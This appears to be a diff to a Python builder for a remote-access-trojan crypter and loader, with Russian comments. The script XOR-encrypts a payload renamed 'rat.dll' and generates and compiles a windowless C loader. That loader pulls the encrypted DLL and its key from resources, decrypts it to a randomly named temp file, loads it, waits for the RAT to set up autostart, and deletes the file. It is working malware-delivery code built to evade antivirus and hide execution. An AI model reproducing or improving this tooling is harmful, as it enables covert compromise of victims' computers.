@@ -3,13 +3,14 @@ import sys
 import subprocess
 import random
 import string
+import shutil
 
 def generate_random_name():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 def build_single_exe_with_dll(exe_path):
     print("=" * 60)
-    print("BUILDING EXECUTABLE")
+    print("BUILDING EXE TO DLL CONVERTER")
     print("=" * 60)
     
     if not os.path.exists(exe_path):
@@ -18,7 +19,7 @@ def build_single_exe_with_dll(exe_path):
     
     output_dir = os.path.dirname(exe_path)
     
-    print("Reading source...")
+    print("Reading source EXE...")
     with open(exe_path, 'rb') as f:
         exe_data = f.read()
     
@@ -30,33 +31,49 @@ def build_single_exe_with_dll(exe_path):
         return None
     print("EXE header OK (MZ)")
     
-    print("Encrypting with XOR...")
+    # Конвертируем EXE в DLL
+    print("Converting EXE to DLL...")
+    dll_path = os.path.join(output_dir, 'rat.dll')
+    
+    # Способ 1: Просто переименовываем (иногда работает)
+    # shutil.copy2(exe_path, dll_path)
+    
+    # Способ 2: Используем pe2dll (если установлен)
+    try:
+        result = subprocess.run(['pe2dll.exe', exe_path, dll_path], capture_output=True)
+        if result.returncode == 0:
+            print("PE2DLL conversion OK")
+        else:
+            # Если pe2dll нет - просто копируем
+            shutil.copy2(exe_path, dll_path)
+            print("PE2DLL not found, using copy method")
+    except:
+        shutil.copy2(exe_path, dll_path)
+        print("PE2DLL not found, using copy method")
+    
+    print(f"DLL size: {os.path.getsize(dll_path) / (1024*1024):.1f} MB")
+    
+    print("Encrypting DLL with XOR...")
+    with open(dll_path, 'rb') as f:
+        dll_data = f.read()
+    
     key = os.urandom(32)
     encrypted = bytearray()
-    for i, byte in enumerate(exe_data):
+    for i, byte in enumerate(dll_data):
         encrypted.append(byte ^ key[i % len(key)])
     
-    name1 = generate_random_name()
-    name2 = generate_random_name()
-    
-    data_bin = os.path.join(output_dir, f'{name1}.bin')
+    # Сохраняем зашифрованные данные как бинарный файл
+    data_bin = os.path.join(output_dir, f'{generate_random_name()}.bin')
     with open(data_bin, 'wb') as f:
         f.write(encrypted)
-    print(f"Encrypted data saved: {name1}.bin ({len(encrypted) / (1024*1024):.1f} MB)")
     
-    key_bin = os.path.join(output_dir, f'{name2}.bin')
+    key_bin = os.path.join(output_dir, f'{generate_random_name()}.bin')
     with open(key_bin, 'wb') as f:
         f.write(key)
-    print(f"Key saved: {name2}.bin ({len(key)} bytes)")
     
-    print("Creating executable with embedded resources...")
+    print("Creating loader...")
     
-    # Прямое встраивание данных в C код (без resource.rc)
-    # Конвертируем данные в C-массив
-    data_hex = encrypted.hex()
-    key_hex = key.hex()
-    
-    loader_code = f'''
+    loader_code = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -64,107 +81,112 @@ def build_single_exe_with_dll(exe_path):
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-// Встроенные данные (без resource.rc)
-static const unsigned char enc_data[] = 
-    "{data_hex}";
-static const size_t enc_size = {len(encrypted)};
+// Данные вставляются через ресурсы
+// Используем простой XOR
 
-static const unsigned char xor_key[] = 
-    "{key_hex}";
-static const size_t key_size = {len(key)};
-
-void xor_decrypt(unsigned char* d, int l, unsigned char* k, int kl) {{
-    for(int i = 0; i < l; i++) {{
-        d[i] ^= k[i % kl];
-    }}
-}}
-
-void run_payload() {{
-    // Расшифровываем
-    unsigned char* out = (unsigned char*)malloc(enc_size);
-    if (!out) {{
+int main() {
+    char dll_path[MAX_PATH];
+    char temp_path[MAX_PATH];
+    
+    GetTempPathA(MAX_PATH, temp_path);
+    
+    // Случайное имя для DLL
+    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    char filename[13];
+    for(int i = 0; i < 12; i++) {
+        filename[i] = chars[rand() % 36];
+    }
+    filename[12] = '\\0';
+    sprintf(dll_path, "%s%s.dll", temp_path, filename);
+    
+    // Загружаем DLL из ресурсов
+    HMODULE hModule = GetModuleHandleA(NULL);
+    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCE(101), "DLL");
+    if (!hRes) {
+        MessageBoxA(NULL, "Resource not found!", "Error", MB_OK);
+        return 1;
+    }
+    
+    HGLOBAL hData = LoadResource(hModule, hRes);
+    if (!hData) {
+        MessageBoxA(NULL, "Failed to load resource!", "Error", MB_OK);
+        return 1;
+    }
+    
+    DWORD data_size = SizeofResource(hModule, hRes);
+    unsigned char* enc_data = (unsigned char*)LockResource(hData);
+    
+    // Расшифровываем XOR
+    // Ключ тоже в ресурсах
+    HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCE(102), "KEY");
+    if (!hKeyRes) {
+        MessageBoxA(NULL, "Key resource not found!", "Error", MB_OK);
+        return 1;
+    }
+    
+    HGLOBAL hKeyData = LoadResource(hModule, hKeyRes);
+    if (!hKeyData) {
+        MessageBoxA(NULL, "Failed to load key!", "Error", MB_OK);
+        return 1;
+    }
+    
+    DWORD key_size = SizeofResource(hModule, hKeyRes);
+    unsigned char* key_data = (unsigned char*)LockResource(hKeyData);
+    
+    unsigned char* decrypted = (unsigned char*)malloc(data_size);
+    if (!decrypted) {
         MessageBoxA(NULL, "Memory allocation failed!", "Error", MB_OK);
-        return;
-    }}
+        return 1;
+    }
     
-    // Конвертируем hex в байты
-    for(size_t i = 0; i < enc_size; i++) {{
-        char hex[3] = {{enc_data[i*2], enc_data[i*2+1], 0}};
-        out[i] = (unsigned char)strtol(hex, NULL, 16);
-    }}
+    memcpy(decrypted, enc_data, data_size);
     
-    xor_decrypt(out, enc_size, (unsigned char*)xor_key, key_size);
+    // XOR decrypt
+    for(DWORD i = 0; i < data_size; i++) {
+        decrypted[i] ^= key_data[i % key_size];
+    }
     
-    // Проверка, что это EXE
-    if (out[0] != 0x4D || out[1] != 0x5A) {{
-        MessageBoxA(NULL, "Decrypted data is NOT a valid EXE!", "Error", MB_OK);
-        free(out);
-        return;
-    }}
+    // Сохраняем DLL
+    HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        MessageBoxA(NULL, "Failed to create DLL file!", "Error", MB_OK);
+        free(decrypted);
+        return 1;
+    }
     
-    char tmp[MAX_PATH];
-    char fn[13];
-    GetTempPathA(MAX_PATH, tmp);
-    const char* c = "abcdefghijklmnopqrstuvwxyz0123456789";
-    for(int i = 0; i < 12; i++) {{
-        fn[i] = c[rand() % 36];
-    }}
-    fn[12] = '\\0';
-    strcat(tmp, fn);
-    strcat(tmp, ".exe");
+    DWORD written;
+    WriteFile(hFile, decrypted, data_size, &written, NULL);
+    CloseHandle(hFile);
     
-    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
-                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (f == INVALID_HANDLE_VALUE) {{
-        MessageBoxA(NULL, "Failed to create temp file!", "Error", MB_OK);
-        free(out);
-        return;
-    }}
+    // Загружаем DLL
+    HMODULE hDll = LoadLibraryA(dll_path);
+    if (!hDll) {
+        MessageBoxA(NULL, "Failed to load DLL!", "Error", MB_OK);
+        DeleteFileA(dll_path);
+        free(decrypted);
+        return 1;
+    }
     
-    DWORD w;
-    if (!WriteFile(f, out, enc_size, &w, NULL) || w != enc_size) {{
-        MessageBoxA(NULL, "Failed to write temp file!", "Error", MB_OK);
-        CloseHandle(f);
-        DeleteFileA(tmp);
-        free(out);
-        return;
-    }}
-    CloseHandle(f);
-    
-    STARTUPINFOA si = {{sizeof(si)}};
-    PROCESS_INFORMATION pi;
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    
-    if (!CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
-                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {{
-        MessageBoxA(NULL, "Failed to start process!", "Error", MB_OK);
-        DeleteFileA(tmp);
-        free(out);
-        return;
-    }}
-    
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    Sleep(9000);
-    DeleteFileA(tmp);
-    free(out);
-}}
-
-int main() {{
-    run_payload();
+    // Запускаем RAT (DllMain уже выполнился при LoadLibrary)
+    // Ждем пока RAT сделает автозагрузку
     Sleep(15000);
+    
+    // Очистка
+    FreeLibrary(hDll);
+    DeleteFileA(dll_path);
+    free(decrypted);
+    
     return 0;
-}}
+}
 '''
     
     loader_src = os.path.join(output_dir, 'loader.c')
     with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
     
-    print("Compiling...")
-    exe_name = f"{generate_random_name()}.exe"
-    loader_exe = os.path.join(output_dir, exe_name)
+    print("Compiling loader...")
+    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
     
     cmd = [
         'gcc',
@@ -204,6 +226,7 @@ int main() {{
         os.remove(loader_src)
         os.remove(data_bin)
         os.remove(key_bin)
+        os.remove(dll_path)
     except:
         pass
     
